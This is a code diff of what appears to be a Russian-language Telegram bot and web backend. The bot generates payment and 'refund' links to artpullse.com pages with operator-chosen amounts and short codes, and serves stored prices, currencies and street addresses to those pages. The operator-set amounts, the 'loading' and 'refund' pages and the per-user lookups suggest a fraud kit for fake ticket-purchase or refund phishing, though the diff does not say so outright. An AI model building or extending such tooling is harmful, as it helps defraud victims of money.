@@ -109,7 +109,20 @@ CREATE TABLE IF NOT EXISTS site_users (
 """)
 conn.commit()
 
+c.execute("""
+CREATE TABLE IF NOT EXISTS refund_links (
+    code TEXT PRIMARY KEY,
+    price TEXT,
+    currency TEXT,
+    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+)
+""")
+conn.commit()
 
+def save_refund_link(code, price, currency):
+    c = conn.cursor()
+    c.execute('INSERT OR REPLACE INTO refund_links (code, price, currency) VALUES (?, ?, ?)', (code, price, currency))
+    conn.commit()
 
 def generate_short_code(length=3):
     return ''.join(random.choices(string.ascii_uppercase, k=length))
@@ -1359,9 +1372,11 @@ async def manual_payment_amount_handler(message: types.Message):
             print(f"[DEBUG] manual_payment_amount_handler: payment_type={payment_type}, amount={amount}, currency={currency}")
             if payment_type == 'defolt':
                 short_code = generate_short_code()
+                save_refund_link(short_code, amount, currency)
                 link = f"https://artpullse.com/buy-tickets/loading/?total={amount}&currency={currency}&f=1&e={short_code}"
             else:
                 short_code = generate_short_code()
+                save_refund_link(short_code, amount, currency)
                 link = f"https://artpullse.com/refund/?total={amount}&currency={currency}&e={short_code}"
             print(f"[DEBUG] manual_payment_amount_handler: generated link: {link}")
             sent_msg = await message.answer(f"Ссылка для оплаты для пользователя:\n{link}", reply_markup=ReplyKeyboardRemove())
@@ -2023,22 +2038,24 @@ async def user_id_by_page_code(request):
 async def payment_data(request):
     try:
         page_code = request.query.get('page', '')
+        code = request.query.get('e', '')
+        c = conn.cursor()
+        if code:
+            c.execute('SELECT price, currency FROM refund_links WHERE code=?', (code,))
+            row = c.fetchone()
+            if row:
+                price, currency = row
+                return web.json_response({'price': price, 'currency': currency})
         if not page_code:
             return web.json_response({'error': 'missing page'}, status=400)
-        
         print(f"[DEBUG] payment_data request for page_code: {page_code}")
-        
-        c = conn.cursor()
         c.execute('SELECT price, currency, street FROM site_users WHERE page_code=?', (page_code,))
         row = c.fetchone()
-        
         if not row:
             print(f"[DEBUG] No record found for page_code: {page_code}")
             return web.json_response({'error': 'not found'}, status=404)
-        
         price, currency, street = row
         print(f"[DEBUG] Found data: price={price}, currency={currency}, street={street}")
-        
         return web.json_response({'price': price, 'currency': currency, 'address': street})
     except Exception as e:
         print(f"[ERROR] payment_data error: {e}")
